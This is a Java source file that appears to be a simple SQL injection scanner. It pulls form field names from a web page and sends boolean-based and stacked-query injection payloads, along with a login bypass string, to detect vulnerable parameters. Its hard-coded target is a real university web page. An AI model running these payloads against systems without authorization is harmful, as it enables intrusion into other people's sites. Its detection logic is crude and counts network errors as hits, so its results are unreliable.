/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package conn;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
//import static java.lang.Integer.min;
import java.net.CookieHandler;
import java.net.CookieManager;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

/**
 *
 * @author KIT376
 */
public class SQLInjectionTest {
    
  private static HttpURLConnection conn;
  private static URL obj= null;
  private List<String> cookies;
  String  invalidInput = 51326+"";
  public static String vector="login=1'%20or%20'1'%20=%20'1&pass=1'%20or%20'1'%20=%20'1";
  
    public static void main(String args[]){
    
        String url="http://www.iiit.ac.in/people/faculty";
        
        
        
        CookieHandler.setDefault(new CookieManager());
        
        SQLInjectionTest sqt = new SQLInjectionTest();
        boolean res = sqt.checkSQLInjection(url);
        
        if(res)
            System.out.println("SQL Injection Detected");
        else
            System.out.println("SQL Injection Not Detected");
       
 
    }
    
    public boolean checkSQLInjection(String url){
        
      int responseCode=0;
      try {
          ArrayList<String> params = getFormParams(url);
          if(params==null) return false;
          for(String param : params){
              if(param.length()==0 || param.equals(" "))continue;
              System.out.println("param is "+param.length());
              if(injectBySingleQuote(url, param) || injectByDoubleQuote(url, param) || injectBySemiColon(url, param)){
                  return true;
              }
          }
      } catch (UnsupportedEncodingException ex) {
          Logger.getLogger(SQLInjectionTest.class.getName()).log(Level.SEVERE, null, ex);
      }
      return false;
    
    }
    
    
    
    public ArrayList<String> getFormParams(String url) throws UnsupportedEncodingException {
 
	System.out.println("Extracting form's data...");
        
        System.out.println("url" + url);
            Connection.Response getRes;
        try {
             getRes = Jsoup.connect(url).method(Connection.Method.GET).execute();
             Map<String, String> loginCookies = getRes.cookies();
             Document doc = getRes.parse();
             Elements forms = doc.getElementsByTag("form");
        
            if(forms.isEmpty()){
                System.out.println("No input Form");
                return null;
            }
        
        Elements inputElements = forms.get(0).getElementsByTag("input");
        Iterator<Element> elementIterator=inputElements.iterator();
        ArrayList<String> paramList = new ArrayList<String>();
        while (elementIterator.hasNext()) {
            Element el1 =elementIterator.next();
            paramList.add(el1.attr("name"));
        }
	return paramList;
    
      } catch (IOException ex) {
          Logger.getLogger(SQLInjectionTest.class.getName()).log(Level.SEVERE, null, ex);
          return null;
      }
    }
    
    
    public boolean injectBySingleQuote(String url, String param){
        
        try{
            String injectNormal = invalidInput;
            
            String finalURL = url+"?"+param+"="+injectNormal;
            System.out.println(finalURL);
            Connection.Response getRes1 = Jsoup.connect(url).method(Connection.Method.GET).execute();
            Map<String, String> loginCookies = getRes1.cookies();
            
            Connection.Response getRes2 = Jsoup.connect(finalURL).method(Connection.Method.GET).cookies(loginCookies).execute();
            String plain = getRes2.parse().html();
            //plain = removeInputValue(plain, param);
            
            
            String injectTrue = invalidInput+"' or 1=1--";
            finalURL = url+"?"+param+"="+injectTrue;
            System.out.println(finalURL);
            getRes2 = Jsoup.connect(finalURL).method(Connection.Method.GET).cookies(loginCookies).execute();
            System.out.println(getRes2.statusCode());
            String correctTrue = getRes2.parse().html();
            
            String injectFalse = invalidInput+"' or 1=2--";
            finalURL = url+"?"+param+"="+injectFalse;
            System.out.println(finalURL);
            getRes2 = Jsoup.connect(finalURL).method(Connection.Method.GET).cookies(loginCookies).execute();
            System.out.println(getRes2.statusCode());
            String correctFalse = getRes2.parse().html();
            //correct = removeInputValue(correct, param);
            
            if(isEqual(plain, correctTrue) && isEqual(plain, correctFalse) && isEqual(correctFalse, correctTrue)){
                return false;
            }
            else return true;
      
        }
        catch(NumberFormatException nfo){
            nfo.printStackTrace();
            return false;
        }
        catch(IOException e){
            e.printStackTrace();
            return true;
        }
        catch(Exception e){
          e.printStackTrace();
          return false;
        }
    }
    
    public boolean injectBySemiColon(String url, String param){
        try{
            String injectNormal = invalidInput;
            
            String finalURL = url+"?"+param+"="+injectNormal;
            System.out.println(finalURL);
            Connection.Response getRes1 = Jsoup.connect(url).method(Connection.Method.GET).execute();
            Map<String, String> loginCookies = getRes1.cookies();
            
            Connection.Response getRes2 = Jsoup.connect(finalURL).method(Connection.Method.GET).cookies(loginCookies).execute();
            String plain = getRes2.parse().html();
            //plain = removeInputValue(plain, param);
            
           /* 
            String injectTrue = invalidInput+"; or 1=1--";
            finalURL = url+"?"+param+"="+injectTrue;
            System.out.println(finalURL);
            getRes2 = Jsoup.connect(finalURL).method(Connection.Method.GET).cookies(loginCookies).execute();
            System.out.println(getRes2.statusCode());
            String correctTrue = getRes2.parse().html();
         */
            String injectFalse = invalidInput+"'; select * from dual;--";
            finalURL = url+"?"+param+"="+injectFalse;
            System.out.println(finalURL);
            getRes2 = Jsoup.connect(finalURL).method(Connection.Method.GET).cookies(loginCookies).execute();
            System.out.println(getRes2.statusCode());
            String correctFalse = getRes2.parse().html();
            //correct = removeInputValue(correct, param);
            
            if(isEqual(plain, correctFalse)){
                return false;
            }
            else return true;
      
        } 
        catch(RuntimeException re){
            re.printStackTrace();
            return true;
        }
        catch(IOException e){
            e.printStackTrace();
            return true;
        }
        catch(Exception e){
          e.printStackTrace();
          return false;
        }
    }
    public boolean injectByDoubleQuote(String url, String param){
        try{
            String injectNormal = invalidInput;
            
            String finalURL = url+"?"+param+"="+injectNormal;
            System.out.println(finalURL);
            Connection.Response getRes1 = Jsoup.connect(url).method(Connection.Method.GET).execute();
            Map<String, String> loginCookies = getRes1.cookies();
            
            Connection.Response getRes2 = Jsoup.connect(finalURL).method(Connection.Method.GET).cookies(loginCookies).execute();
            String plain = getRes2.parse().html();
            //plain = removeInputValue(plain, param);
            
            
            String injectTrue = invalidInput+"\" or 1=1--";
            finalURL = url+"?"+param+"="+injectTrue;
            System.out.println(finalURL);
            getRes2 = Jsoup.connect(finalURL).method(Connection.Method.GET).cookies(loginCookies).execute();
            System.out.println(getRes2.statusCode());
            String correctTrue = getRes2.parse().html();
            
            String injectFalse = invalidInput+"\" or 1=2--";
            finalURL = url+"?"+param+"="+injectFalse;
            System.out.println(finalURL);
            getRes2 = Jsoup.connect(finalURL).method(Connection.Method.GET).cookies(loginCookies).execute();
            System.out.println(getRes2.statusCode());
            String correctFalse = getRes2.parse().html();
            //correct = removeInputValue(correct, param);
            
            if(isEqual(plain, correctTrue) && isEqual(plain, correctFalse) && isEqual(correctFalse, correctTrue)){
                return false;
            }
            else return true;
      
        }
        catch(RuntimeException re){
            re.printStackTrace();
            return true;
        }
        catch(IOException e){
            e.printStackTrace();
            return true;
        }
        catch(Exception e){
          e.printStackTrace();
          return false;
        }
        
    }
private boolean isEqual(String str1, String str2) {
       int len = min(str1.length(), str2.length());
       if(str2.length()-str1.length() >50 )
           return false;
       //System.out.println(str1+"\n\n\n\n\n\n\n\n\n\n"+str2);
               
       int j=0, i;
       for(i=0;i<len-10;){
           //System.out.println(str1.charAt(i)+" "+str2.charAt(j));
           if(str1.charAt(i)!=str2.charAt(j)){
               //System.out.println(str1.substring(i,i+10));
               //System.out.println(str2.substring(j, j+10));
               
               //System.out.println(i+" "+j);
               i=i+20;
               String temp = str1.substring(i, i+10);
               if(!str2.substring(j).contains(temp))
                   return false;
               j = j + str2.substring(j).indexOf(temp);
               
               //System.out.println(str1.substring(i));
               //System.out.println(str2.substring(j));
               
           }
           else {
               i++;j++;
           }
       }
        //System.out.println(i+" "+j);
        //System.out.println(str1.length()+" "+ str2.length());
       if(i==str1.length()-10 && j==str2.length()-10)
           return true;
       return false;
    }

    private int min(int length, int length0) {
        return length > length0 ? length0 : length;
    }
}
    

// Ref  :- https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)